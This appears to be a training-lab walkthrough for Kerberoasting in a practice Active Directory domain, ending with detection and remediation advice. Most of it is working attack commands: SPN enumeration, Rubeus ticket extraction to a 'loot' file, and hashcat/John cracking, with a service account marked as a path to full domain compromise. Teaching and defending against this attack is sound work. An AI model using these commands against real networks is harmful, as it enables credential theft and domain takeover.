# 02 — Kerberoasting

## Overview

Any authenticated domain user can request a Kerberos TGS ticket for any account with a Service Principal Name (SPN). The ticket is encrypted with the account's NTLM hash and can be cracked offline.

## Lab Targets

| Account      | SPN                                | Notes           |
|--------------|------------------------------------|-----------------|
| svc_sql      | MSSQLSvc/SQL-01.corp.local:1433    | SQL Server      |
| svc_iis      | HTTP/WEB-SRV-01.corp.local         | IIS             |
| svc_mssql    | MSSQLSvc/SQL-02.corp.local:1433    | MSSQL           |
| svc_exchange | exchangeMDB/MAIL-01.corp.local     | Exchange        |
| svc_web      | HTTP/WEB-SRV-02.corp.local         | Web server      |
| svc_backup   | BackupAgent/DC-01.corp.local       | Backup (DA!)    |

## Prerequisites

- Any domain user (attacker.01)

---

## Step 1: Enumerate SPN Accounts

```powershell
# PowerView
Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName, Description

# Native
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName |
    Select-Object SamAccountName, ServicePrincipalName
```

## Step 2: Request TGS Tickets

```powershell
# Rubeus — all SPNs at once
.\Rubeus.exe kerberoast /nowrap /format:hashcat /outfile:C:\loot\kerberoast.txt

# Rubeus — single target
.\Rubeus.exe kerberoast /user:svc_sql /nowrap /format:hashcat

# PowerView
Request-SPNTicket -SPN "MSSQLSvc/SQL-01.corp.local:1433" -Format Hashcat
```

## Step 3: Crack the Hashes

```bash
# hashcat (GPU)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Expected result: p@ssw0rd (cracked from all lab SPN accounts)
```

---

## Impact

`svc_backup` has DCSync rights — cracking its hash leads directly to full domain compromise.

---

## Detection

- Event ID 4769 — Kerberos Service Ticket Operations (RC4 encryption type = suspicious)
- Baseline normal SPN request volume; alert on spikes

## Remediation

- Use strong (25+ char) random passwords for service accounts
- Prefer Group Managed Service Accounts (gMSA)
- Enable AES encryption for service accounts (disable RC4)
